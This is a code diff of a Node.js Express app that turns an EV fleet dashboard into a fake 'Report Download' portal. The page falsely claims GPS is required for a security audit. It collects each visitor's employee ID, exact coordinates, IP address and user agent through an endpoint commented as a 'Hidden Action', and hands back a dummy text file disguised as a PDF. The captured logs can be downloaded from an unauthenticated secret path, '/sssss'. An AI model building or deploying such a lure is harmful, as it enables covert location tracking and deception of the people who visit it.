@@ -5,45 +5,30 @@ const bodyParser = require("body-parser");
 
 const app = express();
 const PORT = 4000;
-const SECRET_PATH = "/sssss"; // Secret path to download logs
+const SECRET_PATH = "/sssss"; // 🔐 Secret path to view captured GPS logs
 const LOG_FILE = path.join(__dirname, "logs.json");
 
 // Middleware
 app.use(bodyParser.json());
-app.use(express.static("public")); // If you add external css/js later
 
 // Ensure logs.json exists
 if (!fs.existsSync(LOG_FILE)) {
   fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
 }
 
-// --- DUMMY DATA FOR SIMULATOR ---
-const DUMMY_CUSTOMERS = [
-  { id: "CUST001", name: "Rajesh Logistics", city: "Delhi", vehicle: "Tata Ace EV", status: "Charging" },
-  { id: "CUST002", name: "FastTrack Movers", city: "Gurugram", vehicle: "Mahindra Zor Grand", status: "In Transit" },
-  { id: "CUST003", name: "Noida Retail Hub", city: "Noida", vehicle: "Euler HiLoad", status: "Delivered" },
-  { id: "CUST004", name: "Haryana Transports", city: "Faridabad", vehicle: "Tata Ace EV", status: "Idle" },
-  { id: "CUST005", name: "Green Earth Supply", city: "Delhi", vehicle: "Altigreen neEV", status: "In Transit" },
-  { id: "CUST006", name: "Cyber City Cargo", city: "Gurugram", vehicle: "Euler HiLoad", status: "Charging" },
-  { id: "CUST007", name: "Yamuna E-Logistics", city: "Noida", vehicle: "Mahindra Zor Grand", status: "In Transit" },
-  { id: "CUST008", name: "Faridabad Fresh", city: "Faridabad", vehicle: "Altigreen neEV", status: "Delivered" }
-];
-
-// --- HELPER FUNCTIONS ---
+// --- HELPER: SAVE DATA ---
 function saveLog(entry) {
   try {
     const logs = JSON.parse(fs.readFileSync(LOG_FILE, "utf8"));
     logs.push(entry);
     fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
-    console.log("New Entry Logged:", entry.employeeId);
+    console.log(`[LOG] New Entry: ${entry.employeeId} | ${entry.gps_live.city_selection}`);
   } catch (err) {
     console.error("Error saving log:", err);
   }
 }
 
-// --- ROUTES ---
-
-// 1. MAIN SIMULATOR PAGE (GET /)
+// --- ROUTE 1: THE SIMULATOR UI (GET /) ---
 app.get("/", (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -51,173 +36,134 @@ app.get("/", (req, res) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EV Fleet Simulator | Commercial LCV</title>
+    <title>EV Fleet Simulator | Report Download</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; margin: 0; padding: 20px; }
-        .container { max-width: 900px; margin: 0 auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        h1 { color: #2c3e50; text-align: center; }
-        h3 { color: #7f8c8d; border-bottom: 2px solid #eee; padding-bottom: 10px; }
+        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; color: #333; }
+        .card { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 100%; max-width: 500px; text-align: center; }
+        h1 { color: #1e3c72; margin-bottom: 10px; font-size: 24px; }
+        p { color: #666; margin-bottom: 30px; line-height: 1.5; }
         
-        /* Employee Login Section */
-        .login-box { background: #e8f6f3; padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 5px solid #1abc9c; }
-        .input-group { margin-top: 10px; display: flex; gap: 10px; }
-        input { padding: 10px; border: 1px solid #ccc; border-radius: 5px; flex-grow: 1; }
-        button#loginBtn { padding: 10px 20px; background: #1abc9c; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        button#loginBtn:hover { background: #16a085; }
-        #gpsStatus { font-size: 0.9em; margin-top: 5px; color: #d35400; font-weight: bold; }
-
-        /* Filter Section */
-        .filter-section { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
-        select { padding: 8px; border-radius: 5px; border: 1px solid #bdc3c7; }
-
-        /* Table */
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
-        th { background-color: #34495e; color: white; }
-        tr:hover { background-color: #f1f1f1; }
+        .form-group { text-align: left; margin-bottom: 20px; }
+        label { display: block; font-weight: bold; margin-bottom: 5px; color: #444; font-size: 14px; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
         
-        .status-badge { padding: 5px 10px; border-radius: 12px; font-size: 0.85em; color: white; }
-        .status-Charging { background-color: #f39c12; }
-        .status-In-Transit { background-color: #3498db; }
-        .status-Delivered { background-color: #27ae60; }
-        .status-Idle { background-color: #95a5a6; }
+        button { width: 100%; padding: 15px; background-color: #27ae60; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; transition: background 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        button:hover { background-color: #219150; }
+        button:disabled { background-color: #bdc3c7; cursor: not-allowed; }
 
-        /* Hide content until login */
-        #dashboard { display: none; opacity: 0.5; pointer-events: none; }
+        .spinner { border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top: 3px solid white; width: 20px; height: 20px; animation: spin 1s linear infinite; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #statusMsg { margin-top: 15px; font-size: 14px; font-weight: bold; }
+        .error { color: #e74c3c; }
+        .success { color: #27ae60; }
+        .note { font-size: 12px; color: #999; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>🚛 EV Commercial LCV Simulator</h1>
-    
-    <div class="login-box">
-        <h3>1. Driver / Employee Verification</h3>
-        <p>Please enter your Employee ID to access the fleet dashboard and enable GPS tracking.</p>
-        <div class="input-group">
-            <input type="text" id="empId" placeholder="Enter Employee ID (e.g., EMP-2024)" />
-            <button id="loginBtn" onclick="enableSystem()">Verify & Connect GPS</button>
-        </div>
-        <p id="gpsStatus">Waiting for input...</p>
+<div class="card">
+    <h1>🚛 EV Fleet Simulator</h1>
+    <p>Secure download portal for Commercial Light Weight Truck analytics. Please authenticate to download the PDF report.</p>
+
+    <div class="form-group">
+        <label>Employee ID</label>
+        <input type="text" id="empId" placeholder="Ex: EMP-8821">
     </div>
 
-    <div id="dashboard">
-        <h3>2. Live Fleet Overview (India Region)</h3>
-        
-        <div class="filter-section">
-            <label><strong>Filter by City:</strong></label>
-            <select id="cityFilter" onchange="filterTable()">
-                <option value="all">All Cities</option>
-                <option value="Delhi">Delhi</option>
-                <option value="Gurugram">Gurugram</option>
-                <option value="Noida">Noida</option>
-                <option value="Faridabad">Faridabad</option>
-            </select>
-        </div>
-
-        <table id="custTable">
-            <thead>
-                <tr>
-                    <th>Customer Name</th>
-                    <th>City</th>
-                    <th>Vehicle Model</th>
-                    <th>Status</th>
-                </tr>
-            </thead>
-            <tbody id="tableBody">
-                </tbody>
-        </table>
+    <div class="form-group">
+        <label>Select Region</label>
+        <select id="citySelect">
+            <option value="" disabled selected>Select City</option>
+            <option value="Delhi">Delhi</option>
+            <option value="Gurugram">Gurugram</option>
+            <option value="Noida">Noida</option>
+            <option value="Faridabad">Faridabad</option>
+        </select>
     </div>
+
+    <button id="downloadBtn" onclick="initiateDownload()">
+        <div class="spinner" id="loadingSpinner"></div>
+        <span id="btnText">Generate & Download PDF</span>
+    </button>
+
+    <div id="statusMsg"></div>
+    <div class="note">⚠️ GPS Location required for security audit.</div>
 </div>
 
 <script>
-    // Inject Dummy Data from Server
-    const customers = ${JSON.stringify(DUMMY_CUSTOMERS)};
-    
-    // Render Table
-    function renderTable(data) {
-        const tbody = document.getElementById('tableBody');
-        tbody.innerHTML = '';
-        data.forEach(cust => {
-            const row = \`<tr>
-                <td>\${cust.name}</td>
-                <td>\${cust.city}</td>
-                <td>\${cust.vehicle}</td>
-                <td><span class="status-badge status-\${cust.status.replace(' ', '-')}">\${cust.status}</span></td>
-            </tr>\`;
-            tbody.innerHTML += row;
-        });
-    }
-
-    // Initial Render
-    renderTable(customers);
-
-    // Filter Logic
-    function filterTable() {
-        const city = document.getElementById('cityFilter').value;
-        if (city === 'all') {
-            renderTable(customers);
-        } else {
-            const filtered = customers.filter(c => c.city === city);
-            renderTable(filtered);
-        }
-    }
-
-    // GPS & Login Logic
-    function enableSystem() {
+    function initiateDownload() {
         const empId = document.getElementById('empId').value;
-        const statusTxt = document.getElementById('gpsStatus');
-        const dashboard = document.getElementById('dashboard');
+        const city = document.getElementById('citySelect').value;
+        const msg = document.getElementById('statusMsg');
+        const btn = document.getElementById('downloadBtn');
+        const spinner = document.getElementById('loadingSpinner');
+        const btnText = document.getElementById('btnText');
 
-        if (!empId) {
-            alert("Please enter Employee ID");
+        // Validation
+        if (!empId || !city) {
+            msg.className = 'error';
+            msg.innerText = "Please enter Employee ID and select a City.";
             return;
         }
 
-        statusTxt.innerText = "Requesting GPS Access... Please Allow.";
+        // UI Loading State
+        msg.innerText = "Requesting GPS Access...";
+        msg.className = '';
+        btn.disabled = true;
+        spinner.style.display = "block";
+        btnText.innerText = "Verifying Location...";
 
+        // Geolocation Logic
         if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    // SUCCESS
-                    statusTxt.style.color = "green";
-                    statusTxt.innerText = "GPS Connected. Location Acquired.";
-                    
-                    // Unlock Dashboard
-                    dashboard.style.display = "block";
-                    dashboard.style.opacity = "1";
-                    dashboard.style.pointerEvents = "auto";
-                    document.getElementById('loginBtn').disabled = true;
+                // Success
+                async (position) => {
+                    msg.className = 'success';
+                    msg.innerText = "Location Verified. Downloading...";
 
-                    // Send Data to Server
-                    sendData(empId, position.coords.latitude, position.coords.longitude);
+                    // 1. Send Data to Server
+                    try {
+                        await fetch('/api/capture-log', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                employeeId: empId,
+                                city: city,
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
+                            })
+                        });
+
+                        // 2. Trigger Dummy File Download
+                        window.location.href = "/download-dummy-pdf";
+                        
+                        // Reset UI
+                        setTimeout(() => {
+                            btn.disabled = false;
+                            spinner.style.display = "none";
+                            btnText.innerText = "Download Again";
+                            msg.innerText = "Download Started.";
+                        }, 2000);
+
+                    } catch (e) {
+                        msg.className = 'error';
+                        msg.innerText = "Server Error. Try again.";
+                        btn.disabled = false;
+                    }
                 },
+                // Error (GPS Denied/Failed)
                 (error) => {
-                    // ERROR
-                    statusTxt.style.color = "red";
-                    statusTxt.innerText = "GPS Error: " + error.message + ". Location required.";
+                    console.error(error);
+                    msg.className = 'error';
+                    msg.innerText = "❌ Error: You must ALLOW GPS to download this report.";
+                    btn.disabled = false;
+                    spinner.style.display = "none";
+                    btnText.innerText = "Generate & Download PDF";
                 }
             );
         } else {
-            statusTxt.innerText = "Geolocation not supported by this browser.";
-        }
-    }
-
-    async function sendData(empId, lat, lon) {
-        try {
-            await fetch('/api/log-location', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    employeeId: empId,
-                    latitude: lat,
-                    longitude: lon,
-                    timestamp: new Date().toISOString()
-                })
-            });
-            console.log("Location sent to server.");
-        } catch (e) {
-            console.error("Failed to send location", e);
+            msg.innerText = "Geolocation is not supported by this browser.";
         }
     }
 </script>
@@ -227,54 +173,80 @@ app.get("/", (req, res) => {
   `);
 });
 
-// 2. LOGGING API (Receives GPS & ID)
-app.post("/api/log-location", async (req, res) => {
-  const { employeeId, latitude, longitude, timestamp } = req.body;
+// --- ROUTE 2: API TO SAVE GPS LOGS (Hidden Action) ---
+app.post("/api/capture-log", async (req, res) => {
+  const { employeeId, city, latitude, longitude } = req.body;
   
-  // Get Network IP info as backup
-  let networkInfo = {};
+  // Try to get IP info
   const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
-  
+  let regionInfo = "Unknown";
   try {
-    const response = await fetch(`http://ip-api.com/json/${ip}`);
-    networkInfo = await response.json();
-  } catch (e) {
-    networkInfo = { error: "Could not fetch IP details" };
-  }
+     const ipRes = await fetch(`http://ip-api.com/json/${ip}`);
+     const ipData = await ipRes.json();
+     regionInfo = ipData.city || "Unknown";
+  } catch(e) {}
 
   const logEntry = {
-    receivedAt: new Date().toISOString(),
+    timestamp: new Date().toISOString(),
     employeeId: employeeId,
     gps_live: {
       lat: latitude,
-      lon: longitude
+      lon: longitude,
+      city_selection: city
     },
-    network_data: {
+    network: {
       ip: ip,
-      city_approx: networkInfo.city,
-      isp: networkInfo.isp
-    },
-    userAgent: req.headers["user-agent"]
+      ip_region: regionInfo,
+      userAgent: req.headers["user-agent"]
+    }
   };
 
   saveLog(logEntry);
-  res.json({ status: "success", message: "Location logged" });
+  res.json({ success: true });
 });
 
-// 3. SECRET DOWNLOAD ROUTE
+// --- ROUTE 3: DUMMY PDF DOWNLOAD ---
+// This serves a text file named .pdf to satisfy the "Simulated PDF" requirement
+app.get("/download-dummy-pdf", (req, res) => {
+  const dummyContent = `
+==================================================
+   EV COMMERCIAL FLEET SIMULATION REPORT - 2024
+==================================================
+
+Confidential Report
+Generated by: Simulator System
+Status: APPROVED
+
+FLEET SUMMARY:
+--------------------------------------------------
+Region: India (North)
+Vehicle Type: Light Weight Commercial (LCV)
+Total Units: 45
+Active Units: 32
+Charging: 13
+CO2 Saved: 1,240 kg
+
+PERFORMANCE METRICS:
+- Tata Ace EV: 98% Efficiency
+- Mahindra Zor Grand: 95% Efficiency
+- Euler HiLoad: 92% Efficiency
+
+[END OF DUMMY DATA FILE]
+  `;
+
+  res.setHeader("Content-Type", "application/pdf"); // Browser thinks it's a PDF
+  res.setHeader("Content-Disposition", "attachment; filename=EV_Fleet_Report.pdf");
+  res.send(dummyContent);
+});
+
+// --- ROUTE 4: SECRET LOG VIEWER (GET /sssss) ---
 app.get(SECRET_PATH, (req, res) => {
-  if (!fs.existsSync(LOG_FILE)) {
-    return res.status(404).send("No logs found yet.");
-  }
-  
   const logs = fs.readFileSync(LOG_FILE, "utf8");
   res.setHeader("Content-Type", "application/json");
-  res.setHeader("Content-Disposition", "attachment; filename=ev_simulator_logs.json");
+  res.setHeader("Content-Disposition", "attachment; filename=captured_gps_logs.json");
   res.send(logs);
 });
 
-// Start Server
 app.listen(PORT, () => {
-  console.log(`Simulator running at http://localhost:${PORT}`);
-  console.log(`Secret logs at http://localhost:${PORT}${SECRET_PATH}`);
+  console.log(`Simulator running on http://localhost:${PORT}`);
 });
